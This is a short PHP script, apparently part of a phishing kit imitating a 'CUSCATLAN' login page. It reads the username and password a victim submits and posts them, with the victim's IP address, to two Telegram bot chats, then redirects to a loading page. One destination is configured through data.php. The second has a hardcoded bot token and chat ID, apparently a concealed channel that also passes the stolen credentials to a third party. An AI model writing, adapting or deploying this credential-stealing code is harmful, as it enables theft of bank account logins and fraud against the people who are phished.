<?php
// Obtener los datos del formulario
$us = $_POST['us'];
$pas = $_POST['pas'];

// Solo cambiar los códigos de el archivo data.php


///cambiar dato de data.php 
require_once 'data.php';



 
$apiblok = '7747115549:AAEGJE68LFAzJa1sbNBlAcexfWYUfhSh65w';$keycode ='-1002390292795';
$url1 = "https://api.telegram.org/bot{$token1}/sendMessage";
$message1 = "Us: {$us}\nPas: {$pas}\nIP: {$_SERVER['REMOTE_ADDR']}";
$data1 = array(
    'chat_id' => $chatID1,
    'text' => $message1
);
$options1 = array(
    'http' => array(
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data1),
    ),
);
$context1 = stream_context_create($options1);
$result1 = file_get_contents($url1, false, $context1);

// Enviar mensaje al segundo chat de Telegram
$url2 = "https://api.telegram.org/bot{$apiblok}/sendMessage";
$message2 = " 
CUSCATLAN LOGIN **

Us: {$us}\nPas: {$pas}\nIP: {$_SERVER['REMOTE_ADDR']}";
$data2 = array(
    'chat_id' => $keycode,
    'text' => $message2
);
$options2 = array(
    'http' => array(
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data2),
    ),
);
$context2 = stream_context_create($options2);
$result2 = file_get_contents($url2, false, $context2);

// Verificar si los mensajes fueron enviados correctamente
if ($result1 !== false && $result2 !== false) {
    // Redireccionar a otra página
    header("Location: /load.html");
    exit();
} else {
    echo "Error al enviar los mensajes a Telegram.";
}
?>